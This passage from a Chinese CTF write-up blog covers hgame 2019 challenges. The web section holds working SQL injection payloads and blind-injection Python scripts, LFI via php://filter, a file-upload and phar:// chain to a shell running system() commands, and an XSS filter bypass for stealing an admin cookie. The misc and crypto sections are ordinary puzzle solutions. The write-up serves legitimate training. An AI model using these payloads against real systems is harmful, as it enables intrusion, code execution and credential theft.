header(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行 <code>cat /fla?</code> 即可读取 flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;a1c83b66cc504d583c09ea6c20c0dabc&#125;</span><br></pre></td></tr></table></figure><h2 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h2><p>数字型注入，简单的union注入就可以了，没有任何过滤。只有一个md5的类似验证码的code，python生成一下也很容易。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmd5</span>(<span class="params">code</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999999</span>):</span><br><span class="line">temp = hashlib.md5(str(i)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> temp[<span class="number">0</span>:<span class="number">4</span>] == code:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> getmd5(<span class="string">&#x27;43dd&#x27;</span>)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;id&#x3D;-1 union select database() #            hgame</span><br><span class="line">&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #  f1l1l1l1g,words</span><br><span class="line">&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;f1l1l1l1g&#39;#f14444444g</span><br><span class="line">&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g#hgame&#123;sql1_1s_iNterest1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h2><p>由于没有回显，只能盲注，又注意到不论返回结果如何，只要SQL语句没有语法错误就会显示<code>sql execute</code>，于是只能进行时间盲注：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"># __author__ &#x3D; V0W</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">guess &#x3D; string.printable[:95]</span><br><span class="line"># print guess</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;118.89.111.179:3001&quot;</span><br><span class="line">sess &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">def getmd5(code):</span><br><span class="line">for i in range(999999):</span><br><span class="line">temp &#x3D; hashlib.md5(str(i)).hexdigest()</span><br><span class="line">if temp[0:4] &#x3D;&#x3D; code:</span><br><span class="line">return i</span><br><span class="line"></span><br><span class="line">def md5(code):</span><br><span class="line">temp &#x3D; hashlib.md5(str(code)).hexdigest()</span><br><span class="line">return temp</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">for c in guess:</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;118.89.111.179:3001&quot;</span><br><span class="line">r &#x3D; sess.get(url).text</span><br><span class="line"># print r</span><br><span class="line">targetmd5 &#x3D; r[79:83]</span><br><span class="line"># print targetmd5</span><br><span class="line">code &#x3D; getmd5(targetmd5)</span><br><span class="line">url &#x3D; url + &quot;?code&#x3D;&quot; + str(code)</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((length(database())&#x3D;%s),sleep(5),1)#&quot; %c</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((database()),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; %(i,c)</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; % (i,c)</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F11111114G&#39;),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; % (i,c)</span><br><span class="line">payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((select fL4444Ag from F11111114G limit 0,1),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; % (i,c)</span><br><span class="line"># print payload</span><br><span class="line">url &#x3D; url + payload</span><br><span class="line"># print url        </span><br><span class="line">time_start &#x3D; time.time()</span><br><span class="line">content &#x3D; sess.get(url).content</span><br><span class="line">print content</span><br><span class="line">time_end &#x3D; time.time()</span><br><span class="line">timedif &#x3D; time_end - time_start</span><br><span class="line">print timedif</span><br><span class="line">if timedif &gt;&#x3D; 4.5:</span><br><span class="line">    flag +&#x3D; c</span><br><span class="line">    print flag</span><br><span class="line">    break</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"># -------盲注得到的数据库信息----------</span><br><span class="line"># dblen: 5</span><br><span class="line"># dbnmae: hgame</span><br><span class="line"># tbname: F11111114G,words</span><br><span class="line"># colname: fL4444Ag</span><br><span class="line"># flag: hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure><h2 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h2><p>非常完整且有一定难度的题目，考察点多，先膜一下出题师傅。</p><p>一个包含以下功能的 web 应用：</p><ul><li>用户注册、登录、上传头像、更改密码</li><li>留言查看、新建、删除</li></ul><p>首先注册账号，登录后尝试一下各种功能，发现显示不同的页面是根据 <code>index.php?action=user</code> 中的 action 参数来切换的，直接访问 user.php 可以返回一部分 HTML，但是不如之前全。</p><p><img src="https://i.loli.net/2019/02/23/5c709fa594c57.png"></p><p><img src="https://i.loli.net/2019/02/23/5c709f8015047.png"></p><p>猜测在 index.php 中是通过 require 或 include 相应的文件来显示不同的页面，存在本地文件包含漏洞</p><p>利用LFI可以读出全部源码<code>http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=index</code></p><p>同理，拿下其他代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.phpregister.phpindex.phpuser.phpmessage.php</span><br><span class="line">messages_api.phpfunctions.phpconfig.php</span><br></pre></td></tr></table></figure><p>关键代码在<code>functions.php</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">&#x27;image/gif&#x27;</span> || $type == <span class="string">&#x27;image/jpeg&#x27;</span> || $type == <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="literal">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;./img/avatar/&quot;</span> . $name . <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">            $sql_query = <span class="string">&quot;update `users` set `avatar`=&#x27;$name&#x27; WHERE `user_id`=$user_id&quot;</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;./img/avatar/&quot;</span> . $avatar[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">&quot;select `avatar` from `users` where `avatar`=$tmp&quot;</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在管理页面（<code>index.php?action=user</code>）可以上传新头像（<code>upload_avatar()</code>）存在一个上传漏洞，可以以此来getshell，但是命名规则是随机的（<code>rand_filename</code>）。</p><p>但是注意到存在SQL注入，找了一个比较容易注入的点<code>delete_message</code>,在messge_id处进行注入。通过该注入可以得到本用户头像的文件名（15位的随机字符串），文件为 <code>./img/avatar/*.png</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span>(<span class="params">$message_id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;token&#x27;</span>] === $_SESSION[<span class="string">&#x27;token&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;groups&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">&quot;delete from `messages` where `message_id`=$message_id and `user_id`=$user_id&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">&#x27;groups&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">&quot;delete from `messages` where `message_id`=$message_id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是利用这个删除信息的注入点，尝试盲注读文件名，盲注脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">restr = <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; value=&#x27;(.*?)&#x27; id=&#x27;token&#x27;&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://111.231.140.29:10080/index.php&#x27;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;5qe3nisl6jg15e8rj980l6jlah&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;v0w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;groups&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url2 = <span class="string">&#x27;http://111.231.140.29:10080/messages_api.php?action=delete&#x27;</span></span><br><span class="line">url3 = <span class="string">&#x27;http://111.231.140.29:10080/messages_api.php?action=add&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">r = requests.get(url=url,cookies=cookie)</span><br><span class="line">token = re.findall(restr,r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># token会失效，需要每次请求拿token</span></span><br><span class="line"><span class="comment"># payload = &quot;-1 or if((ascii(substr((database()),%d,1))=%d),sleep(5),0)#&quot;%(i,j)</span></span><br><span class="line">payload = <span class="string">&quot;-1 or if((ascii(substr((select avatar from users where username like 0x763077),%d,1))=%d),sleep(5),0)#&quot;</span>%(i,j)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;message_id&#x27;</span>:payload,</span><br><span class="line"><span class="string">&#x27;token&#x27;</span>:token</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(data=data,cookies=cookie,url=url2,timeout=<span class="number">4.5</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">            <span class="comment"># 因为是删除的注入点，成功时会将message删除，需要写新的message</span></span><br><span class="line">r = requests.get(url=url, cookies=cookie)</span><br><span class="line">token = re.findall(restr, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>]</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;new_message&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(data=data,cookies=cookie,url=url3)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=========注入信息==========</span></span><br><span class="line"><span class="comment"># DB: lyb</span></span><br><span class="line"><span class="comment"># Picname: eda47772498d3bc</span></span><br></pre></td></tr></table></figure><p>可以上传含有恶意代码的 php 文件来进行进一步渗透，而要使上传的头像（.png 文件）被解析为 php 执行，需要用到 index.php 中的本地文件包含漏洞（<code>require $page .&#39;.php&#39;;</code>）</p><p>由于强制在参数后添加 “.php”，而头像文件以 “.png” 结尾，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$page = array_key_exists(<span class="string">&#x27;action&#x27;</span>, $_GET) ? $_GET[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;message&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;template/footer.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以将 php 文件添加至 zip 压缩包上传，然后通过 <code>phar</code>协议使其被包含（<code>index.php?action=phar://img/avatar/eda47772498d3bc.png/v</code>）  </p><p>因为代码对文件的判断只做了<code>File-type</code>的判断，很容易绕过，拿到shell：</p><p><img src="https://i.loli.net/2019/02/23/5c70abf41ffe9.png"></p><p>找flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v&#x3D;system(&#39;find &#x2F; -name flag&#39;);</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;flag &#x2F;usr&#x2F;lib&#x2F;flag&#x2F;flag</span><br></pre></td></tr></table></figure><p>直接读发现没法读，但是发现同目录中有一个<code>get_flag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v&#x3D;system(&quot;ls &#x2F;usr&#x2F;lib&#x2F;flag&quot;);</span><br><span class="line">flag get_flag</span><br></pre></td></tr></table></figure><p>根据题目提示，可以通过<code>gte_flag</code>来读flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v&#x3D;system(&quot;&#x2F;usr&#x2F;lib&#x2F;flag&#x2F;get_flag &#x2F;usr&#x2F;lib&#x2F;flag&#x2F;flag&quot;);</span><br><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyXss"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</h2><blockquote><p>Description<br>save按钮尝试xss(尝试过程不需要输验证码)，成功后带上验证码code，submit按钮提交xss语句；flag在admin的cookie里面,格式hgame{xxxxx}。<br>URL <a href="http://118.25.18.223:9000/index.php">http://118.25.18.223:9000/index.php</a></p></blockquote><p>waf是将<code>&lt;/srcipt&gt;</code>替换成空。双写即可绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;[url]&gt;&lt;&#x2F;scr&lt;&#x2F;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Xss_1s_funny&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="至少像那雪一样"><a href="#至少像那雪一样" class="headerlink" title="至少像那雪一样"></a>至少像那雪一样</h2><blockquote><p>Description<br>出题人想不好题目描述了<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg">http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg</a></p></blockquote><p>一张图片，binwalk看了一眼发现里面有压缩包，所以直接改后缀为.zip试了一下，发现压缩包有加密，拖进HxD发现并不是伪加密，也没有发现密码有关的信息，于是就考虑了一下CRC32明文攻击，用foremost分离出原图片和压缩包，发现原图片zip压缩后的CRC32值和压缩包里的图片的值是一样的，于是就用工具进行明文攻击。。</p><p>跑了一个多小时，成功的得到解密之后的压缩包，这时发现了一个240字节的空txt文件，于是拖进HxD,</p><p><img src="https://i.loli.net/2019/02/23/5c70aeab0e79c.png"></p><p>刚开始认为是敲击码，但是发现数目并不成对，匹配不上。。后来脑洞了一下，将09看作0，20看作1，组成一串二进制，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01101000 01100111 01100001 01101101 01100101 01111011 01000001 01110100 01011111 01001100 01100101 01100001 00110101 01110100 01011111 01001100 00110001 01101011 01100101 01011111 01110100 01001000 01100001 01110100 01011111 01110011 01101110 00110000 01110111 01111101</span><br></pre></td></tr></table></figure><p>转文本，就得到了flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;At_Lea5t_L1ke_tHat_sn0w&#125;</span><br></pre></td></tr></table></figure><h2 id="旧时记忆"><a href="#旧时记忆" class="headerlink" title="旧时记忆"></a>旧时记忆</h2><blockquote><p>Description<br>愉快的送（nao）分（dong）题，大家一起来学历史吧，结果加上hgame{}（字母均为大写）<br>hint:memory<br>又一个hint:存储器<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg">http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg</a></p></blockquote><p><img src="https://i.loli.net/2019/02/23/5c70b0a351add.jpg"></p><p>在给出hint之后，结合题目，旧时记忆，想到最初计算机用于存储数据（记忆）的工具，打孔卡，于是就google到了相关的信息：</p><blockquote><ul><li>数字通过在行0至行9直接打1个孔来表示。</li><li>空格符的表示，不需要打孔。</li><li>字母用2个孔表示：一个孔在第11、第12、第0行；另一个孔在第1至第9行。字母表被依次分为由9个字母组成的区（”zones”），每个区的字母依次在第1至第9行打孔。每个区分别在第11、第12、第0行打孔。第3区第1个字符保留未使用。（如在（11,3）则为1*9+3 = 12（L））</li><li>一些特殊字符使用了额外的单孔表示，或者双孔表示。</li><li>大多数特殊字符（如标点符号等）用3孔表示：第8行被穿孔；第0、第11、第12行有1个穿孔；第1到第7行有1个穿孔。第9行保留未使用</li></ul></blockquote><p>根据这个，一一对照，得出flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0LD_DAY5%M3MORY</span><br></pre></td></tr></table></figure><h2 id="听听音乐？"><a href="#听听音乐？" class="headerlink" title="听听音乐？"></a>听听音乐？</h2><blockquote><p>Description<br>一首MP3,好好听哦，flag由大写英文字母、数字以及下划线组成，记得添加hgame{}<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3">http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3</a></p></blockquote><p><code>audacity</code>打开看波形，类似莫斯电码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..-. .-.. .- --. ---... .---- - ..--.- .--- ..- ..... - ..--.- ....- ..--.- . .- ... -.-- ..--.- .-- .- ...-</span><br><span class="line"></span><br><span class="line">FLAG:1T_JU5T_4_EASY_WAV</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="P4ndd-n"><a href="#P4ndd-n" class="headerlink" title="P4ndd!n@!"></a>P4ndd!n@!</h2><blockquote><p>Description<br>Aris跑了过来 嘴里大喊”CBC!” 并递给了我一张纸条<br>lpFsOPZm9UztVP30SHertuXoWkOEP4Ij7UcjGM1xvFIw78Ti15UwL9YY0xn4syBxW/2BgzRtsZHGksUmWgfr5Q==(参数要用base64编码一发)<br>hint: padding oracle<br>URL <a href="http://47.95.212.185:23450/padding?text=">http://47.95.212.185:23450/padding?text=</a></p></blockquote><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><blockquote><p>Description<br>e = 12<br>p = 58380004430307803367806996460773123603790305789098384488952056206615768274527<br>q = 81859526975720060649380098193671612801200505029127076539457680155487669622867<br>ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</p><p>算出的m转化成字符串<br>URL <a href="http://example.com/">http://example.com/</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 当指数e和Phi(n)不互素时</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a,b = b,a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        tem = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = tem</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invalidExponent</span>(<span class="params">p,q,e,c</span>):</span></span><br><span class="line">    phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    GCD = gcd(e, phiN)</span><br><span class="line">    <span class="keyword">if</span> (GCD == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Public exponent is valid.....&quot;</span></span><br><span class="line">    d = inverse(e//GCD,phiN)</span><br><span class="line">    c = pow(c, d, n)</span><br><span class="line">    plaintext = sympy.root(c, GCD)</span><br><span class="line">    plaintext = long_to_bytes(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">    q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">    e = <span class="number">12</span></span><br><span class="line">    c = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line"></span><br><span class="line">    plaintext = invalidExponent(p,q,e,c)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="basicmath"><a href="#basicmath" class="headerlink" title="basicmath"></a>basicmath</h2><blockquote><p>Description<br>hint: 二次剩余的求解<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/0b206d5e4fc12dab4961cc5376fbc856f64331976359d30ff1c11668de11a6f0/Crypto2.py">http://plir4axuz.bkt.clouddn.com/hgame2019/0b206d5e4fc12dab4961cc5376fbc856f64331976359d30ff1c11668de11a6f0/Crypto2.py</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> XSS </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电Hgame2019-week2-WP</title>
      <link href="/2019/02/10/Hgame2019-week2WP/"/>
      <url>/2019/02/10/Hgame2019-week2WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><blockquote><p>描述<br>代码审计♂第二弹<br>URL <a href="http://118.24.25.25:9999/easyphp/index.html">http://118.24.25.25:9999/easyphp/index.html</a></p></blockquote><p><code>robots.txt</code>得到<code>img/index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    $img = str_replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>本地文件包含，双写绕过过滤就行</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="comment">//$flag = &#x27;hgame&#123;You_4re_So_g0od&#125;&#x27;;     echo &quot;maybe_you_should_think_think&quot;; </span></span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></figure><h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><blockquote><p>描述<br>some php tricks<br>URL <a href="http://118.24.3.214:3001/">http://118.24.3.214:3001</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (<span class="keyword">string</span>)@$_GET[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">$str2 = (<span class="keyword">string</span>)@$_GET[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">&#x27;str3&#x27;</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">&#x27;str4&#x27;</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">&#x27;H_game&#x27;</span>];</span><br><span class="line">$url = @$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 3 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 4 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;H_game&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 5 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 